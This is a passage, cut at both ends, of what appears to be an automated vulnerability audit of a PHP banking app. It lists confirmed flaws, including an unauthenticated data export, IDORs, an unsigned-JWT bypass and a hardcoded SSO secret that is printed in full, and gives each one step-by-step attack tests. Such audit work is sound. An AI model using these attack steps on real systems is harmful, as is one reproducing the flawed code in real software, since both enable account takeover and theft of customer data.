  "impact": "Complete unauthenticated read of the bank's customer database: credentials, 2FA seeds, balances, card data, and every transaction.",
  "severity_reasoning": "High: the export is intentionally public (auth=>false) and dumps SELECT * of the three most sensitive tables. No identity, no role, no field redaction.",
  "dynamic_test": "GET /api/admin/export/users with no Authorization header. Confirm HTTP 200 JSON contains data.users[].password_hash and totp_secret, data.accounts rows (including card fields if seeded), and data.transactions. A 401 would mean the route was later gated; that is not what the source registers."
}
```

#### Validator reasoning

GET /api/admin/export/users is an explicit unauthenticated admin route that dumps the full customer banking database. public/index.php sends every /api/admin/* request to AdminRouter::dispatch() after only CORS handling. In AdminRouter.php line 48 the route is registered with 'auth' => false; the dispatcher then skips AdminAuthMiddleware entirely when $route['auth'] is false, so no JWT, issuer, revocation, or admin-user check runs. AdminUserController::exportAll() takes no auth argument and issues unconstrained SELECT * against users, accounts, and transactions, then Response::success() JSON-encodes the rows and exits. Schema.sql shows those tables contain password_hash, totp_secret, PII, card_number/card_expiry/card_cvv, balances, and full transfer history. PDO FETCH_ASSOC means every column is serialized. Neighboring admin routes correctly set auth => true, so this is an intentional exception rather than a default, and no IP allowlist, API key, or other control exists on the path. CORS even reflects the request Origin, so the dump is browser-reachable as well as via curl.

#### Code evidence

```
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success([
        'users'        => $users,
        'accounts'     => $accounts,
        'transactions' => $transactions,
    ]);
}
```

## 6. Profile update accepts attacker-controlled user_id (IDOR)

- Lead reference: ENCX-006
- Category: A01
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:52
- Fingerprint: b95a43c6df08e17275e331741a3a32c35e0fd9c02b509667b5e29cba74a4f3f3

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 52,
  "symbol": "update",
  "input": "JSON body user_id"
}
```

#### Controls encountered

```
[
  "Route requires AuthMiddleware (any customer token; no ownership/role binding)",
  "Profile field allow-list excludes password/totp_secret/totp_enabled from the SET clause (does not constrain the target id)",
  "Email uniqueness check vs authenticated user email (not a BOLA control; skipped if attacker reuses their own email)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 42,
  "symbol": "update",
  "operation": "user_profile_update"
}
```

#### Counterevidence

```
[
  "Password and TOTP flags are not in the ProfileController allow-list, so this sink does not directly set another user’s password.",
  "No password-reset flow exists in this codebase, so email change is lockout/identity hijack rather than a complete reset-based ATO by itself."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker obtains any customer identity: forged unsigned JWT (decodeToken) or a real login/register token",
    "Internet client → Router PUT /api/profile (auth => true) → AuthMiddleware binds session user",
    "ProfileController::update reads JSON body; if user_id is present it becomes $targetUserId instead of $auth['user']['id']",
    "No ownership/role check; allowed fields (email, name, phone, address) are passed to User::update($targetUserId)",
    "Response returns User::toPublic of the victim, including the new email"
  ],
  "impact": "Cross-customer profile write / account-takeover primitive: change another user's email (login identifier) plus name/phone/address. Combined with unsigned JWTs, no real password is required.",
  "severity_reasoning": "High: authenticated IDOR on identity fields, specifically email, which is the login key. Any session (including a forged unsigned JWT) can retarget the update.",
  "dynamic_test": "Authenticate as user A (or forge JWT sub=A). PUT /api/profile with JSON {\\\"user_id\\\":2,\\\"email\\\":\\\"attacker-takeover@example.com\\\"}. Then GET /api/profile as user 2 (or forged sub=2) and confirm the email changed. Also confirm login for Wei Zhang now requires the new email."
}
```

#### Validator reasoning

PUT /api/profile is a live authenticated customer route (Router.php auth=true) that reaches ProfileController::update with the caller’s AuthMiddleware identity. After an allow-list of profile fields is built, line 53 explicitly honors a client-supplied JSON user_id: `$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id']`. There is no comparison to `$auth['user']['id']`, no role check, and no admin gate. User::update() then issues `UPDATE users SET ... WHERE id = ?` for that integer, so any authenticated caller can change another customer’s first_name, last_name, email, phone, and address.

AuthMiddleware only proves that some valid Bearer token exists; it does not bind the write to the token subject. Validator never inspects user_id, so the field is not stripped. The email uniqueness check compares against the authenticated user’s email, not the target’s, and therefore does not prevent cross-account edits (and can even skip uniqueness when the attacker sets the victim’s email to their own). Seeded users have sequential integer IDs, and registration is public, so obtaining a token and guessing a victim id is trivial.

Impact is object-level write of another customer’s PII plus login lockout by changing their email (login is findByEmail). The success path then returns User::toPublic() of the *target* row, which includes password_hash and totp_secret, amplifying the IDOR. Password and totp_enabled are not writable through this allow-list, and there is no password-reset endpoint, so “instant password ATO” is not this sink—but the BOLA write itself is complete and exploitable.

#### Code evidence

```
// Allow specifying which profile to update
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];

if (!empty($updateData)) {
    User::update($targetUserId, $updateData);
}

$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), 'Profile updated successfully');
```

## 7. Transaction show has no ownership check

- Lead reference: ENCX-007
- Category: A01
- Severity: MEDIUM
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:40
- Fingerprint: 0cee0ceb56e0fed1e613a248e71ddc3494c24c57e91c239187671fe2d8e8444b

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 40,
  "symbol": "show",
  "input": "path id"
}
```

#### Controls encountered

```
[
  "Route requires AuthMiddleware (authentication only; $auth unused in show)",
  "Path constraint {id:\\d+} (numeric id only, no ownership)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 9,
  "symbol": "findById",
  "operation": "transaction_read_without_owner_check"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker authenticates as any customer (real token or unsigned forged JWT with existing sub)",
    "Internet client → Router GET /api/transactions/{id} (auth => true)",
    "AuthMiddleware only proves some user exists; it does not scope the resource",
    "TransactionController::show loads Transaction::findById(path id) with no from/to ownership check (unlike index, which uses findByIdAndUser when account_id is supplied)",
    "Transaction::format returns amount, BSB, account numbers, description, receipt, FX fields to the caller"
  ],
  "impact": "Horizontal disclosure of other customers' payment history by enumerating transaction primary keys.",
  "severity_reasoning": "Medium: requires some customer identity (trivial via unsigned JWT) and id enumeration, but leaks full transfer records of other users with no ownership check.",
  "dynamic_test": "As user 2 (or forged JWT sub=2), GET /api/transactions/1 (a transaction belonging to another user's account). Confirm 200 with from_account_id/to_bsb/to_account_number/amount rather than 404. Enumerate sequential ids to map other customers' payees."
}
```

#### Validator reasoning

GET /api/transactions/{id} is an authenticated IDOR. TransactionController::show receives $auth but never reads it. It loads the row with Transaction::findById((int)$vars['id']), which is SELECT * FROM transactions WHERE id = ? with no join to accounts.user_id and no check that the caller owns from_account_id or to_account_id. On success it JSON-returns Transaction::format(), exposing amount, from_account_id, to_bsb, to_account_number, to_account_id, description, receipt_number, transfer_type, totp_verified, FX fields, and timestamps.

The route is live: Router registers GET /api/transactions/{id:\d+} with auth => true, AuthMiddleware only proves a Bearer token maps to some user, and Response::success writes that payload to the client. Sibling endpoints (TransactionController::index, AccountController::show, AddressBookController::show) all use findByIdAndUser / findByUser; show is the outlier. Transaction ids are AUTO_INCREMENT, so any logged-in customer can enumerate other customers' transfers. AuthMiddleware and the \d+ constraint are not ownership controls.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);

    if (!$txn) {
        Response::notFound('Transaction not found.');
    }

    Response::success(Transaction::format($txn));
}
```

## 8. Hardcoded insurance SSO HMAC secret

- Lead reference: ENCX-008
- Category: A01
- Severity: MEDIUM
- Confidence: 78%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:33
- Fingerprint: b96829a1c7425409e4473db5823cbf83ccb26f3b901aac00c3ca2c988d2efb3f

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 33,
  "symbol": "insurance_sso_secret",
  "input": "INSURANCE_SSO_SECRET getenv fallback"
}
```

#### Controls encountered

```
[
  "SSO issuance endpoints GET /api/insurance/sso and /api/insurance/sso-redirect require AuthMiddleware",
  "SSO JWT exp is 300 seconds",
  "getenv('INSURANCE_SSO_SECRET') can override the default, but Docker, .env.example, and deploy.sh never set it"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/InsuranceService.php",
  "line": 40,
  "symbol": "generateSsoToken",
  "operation": "sso_jwt_hmac"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "FACE Insurance/GooseCable is not in this repository, so it is not proven that the relying party uses this same default HMAC key or treats /sso?token= as login without extra checks",
  "Default insurance_app_url is http://localhost:8001; remote impact requires that URL (or the admin-configured setting) to point at a trusting insurance app"
]
```

#### Attack path

```
{
  "nodes": [
    "Default insurance_sso_secret is the public 32-byte string in config/app.php; Docker does not set INSURANCE_SSO_SECRET",
    "Legitimate path: authenticated GET /api/insurance/sso or /api/insurance/sso-redirect → InsuranceService::generateSsoToken HS256-signs {iss:BankOfEd, sub:email, name} and 302s to insurance_app_url/sso?token=",
    "Attacker who knows the default can locally mint the same HS256 assertion for an arbitrary email without a BankOfEd session",
    "FACE Insurance app that trusts this shared secret accepts the forged SSO token as that customer"
  ],
  "impact": "Forge FACE Insurance SSO assertions for any email/name and authenticate to the insurance app without a BankOfEd login.",
  "severity_reasoning": "Medium: impact is on the downstream insurance app rather than direct bank fund movement, but the HMAC key is public in source and unsigned BankOfEd JWTs can also obtain a legitimately signed SSO URL for any sub.",
  "dynamic_test": "Confirm config default: GET /api/health is unrelated; instead mint HS256 JWT with secret bankofed-goosecable-sso-shared-secret-key-32b, payload iss=BankOfEd, sub=amelia.chen@example.com, exp=now+300, and present it to the insurance app /sso?token= endpoint (or compare against a token produced by GET /api/insurance/sso as that user). Also call GET /api/insurance/sso with a forged customer JWT to obtain a server-signed assertion."
}
```

#### Validator reasoning

The hardcoded SSO HMAC default is real, reachable, and used to sign identity assertions. config/app.php line 33 sets insurance_sso_secret to getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b'. InsuranceService::generateSsoToken loads that config and signs an HS256 JWT (iss=BankOfEd, sub=customer email, name, jti, iat, exp=now+300) with the same string as a second fallback, then getSsoUrl places it on {insurance_app_url}/sso?token=. GET /api/insurance/sso and /api/insurance/sso-redirect both call this path. INSURANCE_SSO_SECRET is not set in Dockerfile, docker-entrypoint.sh, .env.example, or deploy.sh (which rotates JWT_SECRET and ADMIN_JWT_SECRET only), so the published Docker image and a default deploy keep the public key.

AuthMiddleware on those routes only stops unauthenticated callers from asking BankOfEd to mint a token for the logged-in user. It does not bind the HMAC key or stop an attacker who already has the default from locally encoding a fresh assertion for an arbitrary email. The 5-minute exp likewise does not block minting a new token at attack time. There is no aud/nbf check, no server-side jti store, and BankOfEd never verifies these tokens itself.

The remaining limitation is that FACE Insurance / GooseCable is not in this tree, so acceptance of a forged assertion cannot be demonstrated here. That affects exploit completion against the relying party, not the in-repo fact that a public default is the SSO signing key on every reviewed deployment path.

#### Code evidence

```
'insurance_sso_secret' => getenv('INSURANCE_SSO_SECRET') ?: 'bankofed-goosecable-sso-shared-secret-key-32b',

$secret = $config['insurance_sso_secret'] ?? 'bankofed-goosecable-sso-shared-secret-key-32b';
return JWT::encode($payload, $secret, 'HS256');

return $baseUrl . '/sso?token=' . urlencode($token);
```

## 9. User API responses include password_hash and totp_secret

- Lead reference: ENCX-009
- Category: A01
- Severity: MEDIUM
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:69
- Fingerprint: d644ff84581e3a3f41f4f2d0692cf260de708451e4181c64db83bcc233a10dc6

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 47,
  "symbol": "login",
  "input": "login response user object"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer token for GET/PUT /api/profile",
  "AuthService::decodeToken rejects tokens that are not three JWT parts or whose exp is in the past",
  "AuthService::isTokenRevoked rejects known jti values",
  "POST /api/auth/login requires a matching email and password before returning toPublic",
  "POST /api/auth/register only returns the newly created user's row"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 84,
  "symbol": "toPublic",
  "operation": "sensitive_field_serialization"
}
```

#### Counterevidence

```
[
  "Seeded users in install/seed.sql use bcrypt ($2y$10$...), not MD5; only AuthService::hashPassword() (new registrations) writes unsalted MD5.",
  "totp_secret is NULL until TOTP setup, so users who never enabled 2FA leak only the password hash via this path.",
  "AdminUserController's customer formatter omits password_hash and totp_secret, so the admin API is not an additional sink.",
  "Login itself does not consume TOTP; the leaked totp_secret is used for transfer/2FA verification rather than session login."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Internet client hits unauthenticated POST /api/auth/login or POST /api/auth/register, or authenticated GET /api/profile",
    "AuthController / ProfileController::show call User::toPublic($user)",
    "User::toPublic includes password_hash and totp_secret in the returned array (no stripping)",
    "Response::success JSON-echoes those fields; the SPA stores the user object in localStorage via setUser()",
    "AuthService still verifies 32-char hashes as unsalted MD5, so a leaked hash is immediately reusable"
  ],
  "impact": "Credential and 2FA-seed leak to the browser, proxy logs, XSS, or any IDOR that returns toPublic (profile update of another user). Offline crack of MD5 hashes and cloning of TOTP.",
  "severity_reasoning": "Medium: secrets are sent to the legitimate user agent on every login/profile, turning XSS, shared devices, and the profile IDOR into full credential+2FA theft. Not remotely unauthenticated by itself except via register/login of the attacker's own account (which still demonstrates the leak).",
  "dynamic_test": "POST /api/auth/login with a seeded user (e.g. amelia.chen@example.com / password) or GET /api/profile with any customer token. Confirm the JSON data.user.password_hash and data.user.totp_secret (or data.password_hash on profile) are present. After PUT /api/profile IDOR, confirm the victim's hash/secret are returned in the update response."
}
```

#### Validator reasoning

User::toPublic() is a live, reachable serializer that copies password_hash and totp_secret into JSON returned by login, register, GET /api/profile, and PUT /api/profile. There is no field-filtering, encoding, or authorization boundary that strips those secrets before Response::success() json_encodes the payload.

Concrete source-to-sink:
1. User::findByEmail / findById loads SELECT * rows, including password_hash and totp_secret.
2. User::toPublic() (User.php:68-86) explicitly includes both fields in the “public” DTO.
3. AuthController::login (line 73) and register (line 42) return that DTO plus a JWT. ProfileController::show (line 14) and update (line 60) do the same.
4. The banking SPA stores the entire object: auth.js calls Api.setUser(res.data.user) after login/register; api.js setUser() JSON.stringifies it into localStorage key bankofed_user.

The named auth “control” does not block disclosure:
- Login/register intentionally send the secrets to the caller after a successful credential check. The client never needs the hash or TOTP seed for UI.
- GET /api/profile is gated by AuthMiddleware, but AuthService::decodeToken() only base64-decodes the JWT payload and checks exp; it never verifies the HS256 signature. An attacker can forge Bearer eyJhbGciOiJub25lIn0.{“sub”:&lt;victimId&gt;,“exp”:&lt;future&gt;,“jti”:&lt;unused&gt;}.sig, pass AuthMiddleware, and receive that victim’s password_hash and totp_secret with no valid session.
- New passwords are unsalted MD5 (AuthService::hashPassword), and verifyPassword still accepts 32-char MD5 hashes, so a leaked hash is immediately crackable. Seeded users are bcrypt, but those hashes are still exposed and TOTP secrets remain usable as 2FA seeds (TotpService::verify on transfers).

This is therefore both a first-party secret leak (own hash/seed in HTTP + localStorage) and, via the unsigned JWT, an unauthenticated cross-user credential/2FA dump. No effective blocking control exists on the serialization path.

#### Code evidence

```
public static function toPublic(array $user): array
{
    return [
        'id'            => (int)$user['id'],
        ...
        'totp_enabled'  => (bool)$user['totp_enabled'],
        'password_hash' => $user['password_hash'],
        'totp_secret'   => $user['totp_secret'],
    ];
}

// AuthController login/register
Response::success([
    'user'  => User::toPublic($user),
    'token' => $token,
], ...);
```

## 10. Unauthenticated /api/health leaks JWT secret and database credentials

- Lead reference: ENCX-010
- Category: A01
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:33
- Fingerprint: d405b662a2056a122cedc03452b42c0a2cbe3cfc9d2a3ad5ce535b04383189a4

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 87,
  "symbol": "dispatch",
  "input": "GET /api/health with auth=false"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 33,
  "symbol": "health",
  "operation": "Response::success leaks jwt_secret and DB config"
}
```

#### Counterevidence

```
[
  "db_pass, admin secrets, machine_token, and insurance_sso_secret are not included in the health payload.",
  "AuthService::decodeToken does not verify JWT signatures, so customer-token forgery does not strictly require the leaked jwt_secret; the secret is still disclosed and is used to sign tokens."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External unauthenticated HTTP client",
    "GET /api/health (Router.php auth => false; public/index.php forwards /api/* after CORS only)",
    "AuthMiddleware and MachineAuthMiddleware skipped because route auth is false",
    "Router::health() require()s config/app.php at request time",
    "Response::success JSON-encodes jwt_secret, db_host, db_name, db_user and exits"
  ],
  "impact": "Unauthenticated disclosure of the HS256 JWT signing secret and live database host/name/user, enabling customer-token forgery (if signatures are later verified) and targeted compromise of the banking database.",
  "severity_reasoning": "The health handler is a live public FastRoute with auth explicitly false, so any Internet caller receives the production jwt_secret used by AuthService::createToken plus database connection identifiers. That is a direct cryptographic-secret leak on a banking API with no IP allowlist or redaction. db_pass is omitted, but the signing key alone is high-impact.",
  "dynamic_test": "Issue GET /api/health with no Authorization header. Confirm HTTP 200 JSON includes non-empty jwt_secret matching config/app.php, plus db_host, db_name, and db_user. Optionally sign a customer JWT with the leaked secret and present it to GET /api/profile to show the secret is live."
}
```

#### Validator reasoning

GET /api/health is a live FastRoute handler with auth explicitly set to false. Router::dispatch only invokes AuthMiddleware when auth === true (or MachineAuthMiddleware when auth === 'machine'); a false flag therefore skips all authentication. The health() handler loads config/app.php at request time and passes jwt_secret, db_host, db_name, and db_user into Response::success, which json_encodes the payload and exits. public/index.php routes every /api/* request into Router::dispatch after CORS, with no extra gate. jwt_secret is the HS256 key used by AuthService::createToken, so the leak is a real cryptographic secret, not a placeholder field. db_pass is not included, but host/name/user plus the signing secret are sufficient for the claimed information-disclosure impact. No IP allowlist, env-based redaction, or other control sits on this path.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
// route: $r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 11. JWT authentication accepts unsigned/forged tokens

- Lead reference: ENCX-011
- Category: A07
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:53
- Fingerprint: 01422f41447eed738b455742fe7a4fe60acaac9883a5d83e9de242119893171e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 22,
  "symbol": "handle",
  "input": "HTTP Authorization Bearer token"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires Authorization: Bearer and a three-part token",
  "decodeToken() rejects missing/expired exp",
  "AuthMiddleware rejects jti values present in revoked_tokens",
  "AuthMiddleware rejects sub values that do not map to a users row"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 58,
  "symbol": "decodeToken",
  "operation": "base64-decode JWT payload without signature check"
}
```

#### Counterevidence

```
[
  "AdminAuthMiddleware correctly uses JWT::decode() with Key(jwt_secret, jwt_algorithm), confirming the library is available but unused on the customer path"
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker forges a three-part JWT (header.payload.sig) with existing users.sub, unused jti, and future exp",
    "Authorization: Bearer on any customer route with auth => true (e.g. GET /api/profile, POST /api/transfers/external)",
    "Router::dispatch invokes AuthMiddleware::handle",
    "AuthMiddleware extracts the Bearer token and calls AuthService::decodeToken",
    "decodeToken splits on '.', base64-decodes the payload, checks only exp; parts[2] HMAC is never verified",
    "isTokenRevoked(jti) misses a fresh jti; User::findById(sub) loads the victim",
    "Handler runs with $auth['user'] as that customer"
  ],
  "impact": "Unauthenticated full customer-session takeover: attacker impersonates any existing user id and reaches profile, accounts, transfers, TOTP, and address-book APIs.",
  "severity_reasoning": "decodeToken is the only verifier on the customer API and never calls JWT::decode or uses jwt_secret. Remaining checks (three-part shape, exp, unused jti, existing sub) are all attacker-controlled. User IDs are sequential integers, so any customer account is reachable without a password. AdminAuthMiddleware correctly verifies signatures, confirming this is a customer-path defect.",
  "dynamic_test": "Mint a JWT whose payload is {\"sub\":1,\"jti\":\"<uuid>\",\"exp\":<now+3600>} with any header and dummy signature. Call GET /api/profile with Authorization: Bearer <forged>. Expect 200 and user id 1 (or another seeded id), proving authentication without a valid HMAC."
}
```

#### Validator reasoning

AuthService::decodeToken() is the only JWT verifier on the customer API. It splits a three-part token, base64-decodes the payload, and returns it after an expiry check. Firebase\JWT is imported and used by createToken() / AdminAuthMiddleware, but decodeToken() never calls JWT::decode() and never uses jwt_secret. Router.php invokes AuthMiddleware::handle() for every customer route with auth => true (profile, accounts, transfers, TOTP, address book, transactions, insurance SSO). AuthMiddleware only rejects missing Bearer tokens, expired payloads, revoked jti values, and unknown user ids. An attacker can mint header.payload.sig with an arbitrary sub (seeded users start at id 1), a future exp, and a fresh jti that is not in revoked_tokens; User::findById() then loads that customer and the handler runs as them. No encoding, authorization, or framework control blocks this path.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        // Decode token payload without strict signature verification
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload;
    } catch (\Exception $e) {
        return null;
    }
}
```

## 12. Profile update IDOR via user_id allows mutating other customers

- Lead reference: ENCX-012
- Category: API1
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:54
- Fingerprint: 5af01c05a1a1977c94b98e74231babbe60073127e9a47eea1ea619ec75905cb6

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 19,
  "symbol": "update",
  "input": "JSON body user_id plus profile fields"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer token but only authenticates the caller; it does not bind the update target to the subject",
  "Field allowlist in ProfileController::update and User::update blocks password/totp writes but does not constrain which user row is updated",
  "Email uniqueness check compares against $auth['user']['email'], not the target profile, so it does not prevent cross-user email changes to unused addresses"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 58,
  "symbol": "User::update",
  "operation": "UPDATE users SET ... WHERE id = attacker-chosen user_id"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker obtains any customer JWT (public POST /api/auth/register, login, or forged unsigned token)",
    "PUT /api/profile with JSON body user_id=<victim> plus first_name/email/phone/address fields",
    "Router auth => true: AuthMiddleware authenticates the caller only",
    "ProfileController::update sets $targetUserId from body.user_id without comparing to $auth['user']['id']",
    "User::update($targetUserId, $updateData) executes parameterized UPDATE users SET ... WHERE id = ?",
    "User::findById($targetUserId) + User::toPublic() returns the victim row including password_hash and totp_secret"
  ],
  "impact": "Any logged-in customer can change another user's name, email, phone, and address (account lockout/hijack via unique email) and read that victim's password hash and TOTP secret.",
  "severity_reasoning": "Object-level authorization is entirely missing on a mutating profile endpoint. User IDs are AUTO_INCREMENT and enumerable. The field allowlist does not bind the target to the JWT subject, and email uniqueness is checked against the attacker rather than the victim. Combined with toPublic leaking credentials, this is high-impact BOLA.",
  "dynamic_test": "Register two users. As user A, PUT /api/profile with {\"user_id\": <B's id>, \"email\": \"taken@example.com\", \"first_name\": \"Hijacked\"}. Confirm B's row is updated and the response contains B's password_hash and totp_secret. Also try {\"user_id\": <B>} with no other fields to show read-only credential theft."
}
```

#### Validator reasoning

PUT /api/profile is a live customer route (Router.php auth => true) that always reaches ProfileController::update after AuthMiddleware. The handler binds $user from the JWT subject, then independently sets $targetUserId from the JSON body: isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id']. There is no comparison of $targetUserId to $auth['user']['id'], no role/admin gate, and no other authorization helper. A field allowlist only restricts which columns are written (name, email, phone, address); user_id is used solely as the UPDATE target. User::update() then executes a parameterized UPDATE users SET ... WHERE id = ? for that attacker-chosen id. User ids are AUTO_INCREMENT integers, so they are enumerable. Email uniqueness is checked against the authenticated user's email, not the target, so an attacker can assign the victim a fresh unused email (schema UNIQUE on users.email) and lock them out of login, or freely overwrite PII. Authentication is a prerequisite, not a blocking control. Source-to-sink is complete and reachable by any logged-in customer.

#### Code evidence

```
$allowed = [
    'first_name', 'last_name', 'email', 'phone',
    'address_line1', 'address_line2', 'suburb', 'state', 'postcode',
];
$updateData = array_intersect_key($data, array_flip($allowed));

// Allow specifying which profile to update
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];

if (!empty($updateData)) {
    User::update($targetUserId, $updateData);
}

$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), 'Profile updated successfully');
```

## 13. Transaction detail endpoint lacks ownership check

- Lead reference: ENCX-013
- Category: API1
- Severity: MEDIUM
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:41
- Fingerprint: 5e79853b58418f689cc9734129ff56026a67b89460c5b2096768b3e76b4f171d

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 80,
  "symbol": "dispatch",
  "input": "GET /api/transactions/{id} path parameter"
}
```

#### Controls encountered

```
[
  "Route requires AuthMiddleware (session authenticity only, not object-level authorization)",
  "Path id is constrained to digits ({id:\\d+}) and cast to int"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 41,
  "symbol": "show",
  "operation": "Transaction::findById without user scope"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker authenticates as any customer (public register/login or forged JWT)",
    "GET /api/transactions/{id} with sequential integer path id",
    "Router auth => true: AuthMiddleware validates session only",
    "TransactionController::show ignores $auth['user'] and casts $vars['id']",
    "Transaction::findById runs SELECT * FROM transactions WHERE id = ? with no user/account predicate",
    "Transaction::format + Response::success returns from_account_id, to_bsb, to_account_number, amount, description, receipt_number, FX fields"
  ],
  "impact": "Authenticated enumeration of other customers' transfer receipts: amounts, destination BSB/account numbers, descriptions, and related FX data.",
  "severity_reasoning": "Sibling handlers correctly use findByIdAndUser/findByUser; this show path is a complete object-level authorization miss on auto-increment IDs. Impact is confidentiality of banking transactions rather than fund movement, supporting medium severity.",
  "dynamic_test": "As user A, create a transfer and note its id. As unrelated user B, GET /api/transactions/<A's id>. Confirm 200 with A's amount, to_bsb, to_account_number, and description. Enumerate nearby IDs to map other receipts."
}
```

#### Validator reasoning

GET /api/transactions/{id} is a concrete authenticated IDOR. Router.php registers the route with AuthMiddleware only. TransactionController::show receives $auth but never reads $auth['user']; it casts $vars['id'] and calls Transaction::findById, which runs SELECT * FROM transactions WHERE id = ? with no join or predicate on accounts.user_id. A missing row 404s; otherwise Transaction::format() serializes from_account_id, to_bsb, to_account_number, to_account_id, amount, description, transfer_type, address_book_id, totp_verified, status, receipt_number, FX fields, and created_at via Response::success. IDs are auto-increment (Transaction::create uses lastInsertId), so any logged-in customer can enumerate other customers' transfers. This is not dead code and is not an admin-only path (AdminAuthMiddleware is unused here). Contrast with TransactionController::index (Transaction::findByUser), AccountController::show (Account::findByIdAndUser), and AddressBookController::show (AddressBookEntry::findByIdAndUser). AuthMiddleware only proves a valid session; it does not bind the row to the caller. No DB RLS, no post-fetch ownership check, and no redaction in format().

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);

    if (!$txn) {
        Response::notFound('Transaction not found.');
    }

    Response::success(Transaction::format($txn));
}
```

## 14. External transfer IDOR lets any user debit another customer's account

- Lead reference: ENCX-014
- Category: API1
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:175
- Fingerprint: e20aec41bd2cece0bf3d772b410efea53ebb6425c192659240504aba0cd86654

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 109,
  "symbol": "transferExternal",
  "input": "JSON from_account_id"
}
```

#### Controls encountered

```
[
  "Route POST /api/transfers/external requires AuthMiddleware (authentication only; no account-ownership authorization)",
  "Address-book destinations are scoped with AddressBookEntry::findByIdAndUser to the caller, which does not protect the source account and lets the attacker send funds to a payee they control",
